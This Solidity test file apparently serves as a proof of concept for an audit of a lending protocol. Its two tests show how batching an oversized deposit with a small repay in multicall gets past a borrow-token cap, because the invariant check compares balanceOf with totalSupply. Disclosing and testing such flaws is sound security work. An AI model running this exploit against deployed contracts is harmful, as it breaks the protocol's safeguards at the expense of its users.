// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {BaseTest} from "@test/BaseTest.sol";
import {Vars} from "@test/BaseTest.sol";

import {RESERVED_ID} from "@src/libraries/LoanLibrary.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {DebtPosition} from "@src/libraries/LoanLibrary.sol";
import {RepayParams} from "@src/libraries/actions/Repay.sol";
import {DepositParams} from "@src/libraries/actions/Deposit.sol";
import {BuyCreditLimitParams} from "@src/libraries/actions/BuyCreditLimit.sol";
import {YieldCurveHelper} from "@test/helpers/libraries/YieldCurveHelper.sol";
import {Errors} from "@src/libraries/Errors.sol";

/// @title ExploitTest
/// @notice Demonstrates the vulnerability in the multicall function's invariant check
/// @dev The vulnerability allows users to deposit more borrowAToken than the debt they are repaying,
///      bypassing the intended cap protection mechanism.
///
///      ROOT CAUSE: Multicall.sol compares balanceOf(address(this)) vs totalSupply()
///      - Line 29: borrowATokenSupplyBefore = borrowAToken.balanceOf(address(this)) [WRONG - should be totalSupply()]
///      - Line 30: debtTokenSupplyBefore = debtToken.totalSupply() [CORRECT]
///      - Line 37: borrowATokenSupplyAfter = borrowAToken.balanceOf(address(this)) [WRONG - should be totalSupply()]
///      - Line 38: debtTokenSupplyAfter = debtToken.totalSupply() [CORRECT]
///
///      This means the invariant check compares apples to oranges:
///      - borrowAToken: Size contract's balance (balanceOf)
///      - debtToken: Global total supply (totalSupply)
contract ExploitTest is BaseTest {

    /// @notice Demonstrates that the multicall invariant check is broken
    /// @dev The test shows that a user can deposit significantly more borrowAToken than needed to repay debt,
    ///      which should be prevented by the invariant check in validateBorrowATokenIncreaseLteDebtTokenDecrease.
    ///
    ///      The vulnerability occurs because:
    ///      1. Multicall.sol line 29 uses: borrowAToken.balanceOf(address(this)) instead of totalSupply()
    ///      2. Multicall.sol line 37 uses: borrowAToken.balanceOf(address(this)) instead of totalSupply()
    ///      3. But lines 30 and 38 correctly use debtToken.totalSupply()
    ///      4. During deposit: borrowAToken is minted to the USER (increases totalSupply, but not Size's balance)
    ///      5. During repay: borrowAToken is transferred FROM user TO Size contract (increases Size's balance)
    ///      6. The invariant check sees Size contract's balance increase, not the total supply increase
    ///      7. This allows users to deposit far more than they repay, violating the intended invariant
    ///
    ///      Expected behavior: borrowAToken.totalSupply() increase <= debtToken.totalSupply() decrease
    ///      Actual behavior: borrowAToken.balanceOf(Size) increase <= debtToken.totalSupply() decrease
    function test_Exploit_MulticallInvariantBroken() public {
        // Setup: Create a lending scenario with a cap that's close to being hit
        _setPrice(1e18);

        // Set a cap that will be exceeded during the exploit
        uint256 initialCap = 100e6;
        _updateConfig("borrowATokenCap", initialCap);

        // Alice deposits USDC (lender) - fills up most of the cap
        _deposit(alice, usdc, initialCap);

        // Bob deposits WETH as collateral (borrower)
        _deposit(bob, weth, 200e18);

        // Alice creates a buy credit limit (willing to lend)
        _buyCreditLimit(alice, block.timestamp + 365 days, YieldCurveHelper.pointCurve(365 days, 0.1e18));

        // Bob borrows a small amount (10 USDC)
        uint256 borrowAmount = 10e6;
        uint256 debtPositionId = _sellCreditMarket(bob, alice, RESERVED_ID, borrowAmount, 365 days, false);
        uint256 futureValue = size.getDebtPosition(debtPositionId).futureValue;

        // Verify the debt was created
        assertEq(_state().bob.debtBalance, futureValue);

        // Time passes, Bob wants to repay
        vm.warp(block.timestamp + 365 days);

        // Calculate how much borrowAToken Bob needs to repay
        uint256 bobCurrentBorrowAToken = size.getUserView(bob).borrowATokenBalance;
        uint256 remaining = futureValue - bobCurrentBorrowAToken;

        // THE EXPLOIT: Bob deposits WAY MORE than needed to repay the debt
        // He should only be able to deposit 'remaining' amount to repay the debt
        // But he will deposit 50e6 USDC (much more than the ~11e6 debt)
        uint256 excessiveDeposit = 50e6;

        // Verify that excessive deposit is much larger than what's needed
        assertGt(excessiveDeposit, remaining, "Excessive deposit should be larger than remaining debt");

        // Give Bob the excessive amount of USDC
        _mint(address(usdc), bob, excessiveDeposit);
        _approve(bob, address(usdc), address(size), excessiveDeposit);

        // Record borrowAToken TOTAL SUPPLY before the exploit (this is what should be checked)
        uint256 borrowATokenTotalSupplyBefore = usdc.balanceOf(address(variablePool));
        uint256 debtTokenTotalSupplyBefore = _state().bob.debtBalance;

        // Execute the exploit via multicall: deposit excessive amount and repay small debt
        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeCall(size.deposit, DepositParams({token: address(usdc), amount: excessiveDeposit, to: bob}));
        data[1] = abi.encodeCall(size.repay, RepayParams({debtPositionId: debtPositionId}));

        vm.prank(bob);
        size.multicall(data);

        // Record borrowAToken TOTAL SUPPLY after the exploit
        uint256 borrowATokenTotalSupplyAfter = usdc.balanceOf(address(variablePool));
        uint256 debtTokenTotalSupplyAfter = _state().bob.debtBalance;

        // Calculate the actual changes in TOTAL SUPPLY
        uint256 borrowATokenSupplyIncrease = borrowATokenTotalSupplyAfter > borrowATokenTotalSupplyBefore
            ? borrowATokenTotalSupplyAfter - borrowATokenTotalSupplyBefore : 0;
        uint256 debtTokenSupplyDecrease = debtTokenTotalSupplyBefore > debtTokenTotalSupplyAfter
            ? debtTokenTotalSupplyBefore - debtTokenTotalSupplyAfter : 0;

        // VULNERABILITY PROOF: The invariant is violated
        // borrowAToken total supply increased by ~50e6 (the deposit)
        // debtToken total supply decreased by ~11e6 (the repayment)
        // The invariant should enforce: borrowATokenSupplyIncrease <= debtTokenSupplyDecrease
        // But it doesn't because it checks balanceOf(Size) instead of totalSupply()
        assertGt(borrowATokenSupplyIncrease, debtTokenSupplyDecrease,
            "VULNERABILITY: borrowAToken total supply increased more than debt total supply decreased");

        // Show the magnitude of the violation
        assertApproxEqAbs(debtTokenSupplyDecrease, futureValue, 1e6, "Debt decreased by futureValue (~11e6)");
        assertApproxEqAbs(borrowATokenSupplyIncrease, excessiveDeposit, 1e6, "BorrowAToken increased by deposit (50e6)");

        // The exploit succeeded: Bob deposited way more than he repaid
        assertGt(excessiveDeposit, futureValue * 4, "Bob deposited more than 4x the debt he repaid");

        // Verify the debt was repaid (so the multicall succeeded)
        assertEq(_state().bob.debtBalance, 0, "Debt should be fully repaid");

        // Verify Bob now has excessive borrowAToken balance
        assertGt(size.getUserView(bob).borrowATokenBalance, futureValue,
            "Bob has more borrowAToken than the debt he repaid");
    }

    /// @notice Demonstrates that the invariant check should prevent excessive deposits but doesn't
    /// @dev This test shows the expected behavior vs actual behavior more clearly
    function test_Exploit_InvariantShouldRevertButDoesnt() public {
        // Setup similar to previous test
        _setPrice(1e18);
        uint256 cap = 100e6;
        _updateConfig("borrowATokenCap", cap);

        _deposit(alice, usdc, cap);
        _deposit(bob, weth, 200e18);

        _buyCreditLimit(alice, block.timestamp + 365 days, YieldCurveHelper.pointCurve(365 days, 0.1e18));

        // Bob borrows 10 USDC
        uint256 borrowAmount = 10e6;
        uint256 debtPositionId = _sellCreditMarket(bob, alice, RESERVED_ID, borrowAmount, 365 days, false);
        uint256 futureValue = size.getDebtPosition(debtPositionId).futureValue;

        vm.warp(block.timestamp + 365 days);

        // Bob tries to deposit 100e6 USDC while only repaying ~11e6 debt
        // This should violate the invariant: borrowATokenIncrease (100e6) > debtTokenDecrease (~11e6)
        uint256 massiveDeposit = 100e6;

        _mint(address(usdc), bob, massiveDeposit);
        _approve(bob, address(usdc), address(size), massiveDeposit);

        // Record the state before to prove the invariant violation
        uint256 borrowATokenTotalSupplyBefore = usdc.balanceOf(address(variablePool));
        uint256 debtTokenTotalSupplyBefore = _state().bob.debtBalance;

        // EXPECTED: This should revert with BORROW_ATOKEN_INCREASE_EXCEEDS_DEBT_TOKEN_DECREASE
        // ACTUAL: It succeeds, proving the vulnerability
        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeCall(size.deposit, DepositParams({token: address(usdc), amount: massiveDeposit, to: bob}));
        data[1] = abi.encodeCall(size.repay, RepayParams({debtPositionId: debtPositionId}));

        // This should revert but doesn't - that's the vulnerability
        vm.prank(bob);
        size.multicall(data);

        // If we reach here, the vulnerability is confirmed
        // The multicall succeeded when it should have reverted
        assertTrue(true, "Multicall succeeded when it should have reverted - vulnerability confirmed");

        // Prove the invariant was violated
        uint256 borrowATokenTotalSupplyAfter = usdc.balanceOf(address(variablePool));
        uint256 debtTokenTotalSupplyAfter = _state().bob.debtBalance;

        uint256 borrowATokenSupplyIncrease = borrowATokenTotalSupplyAfter - borrowATokenTotalSupplyBefore;
        uint256 debtTokenSupplyDecrease = debtTokenTotalSupplyBefore - debtTokenTotalSupplyAfter;

        // The invariant violation: deposited 100e6 but only reduced debt by ~11e6
        assertGt(borrowATokenSupplyIncrease, debtTokenSupplyDecrease,
            "Invariant violated: borrowAToken increased more than debt decreased");
        assertGt(massiveDeposit, futureValue * 8, "Deposited 8x more than debt repaid");

        // Verify the cap was exceeded
        assertGt(borrowATokenTotalSupplyAfter, cap, "Cap was exceeded");
    }
}
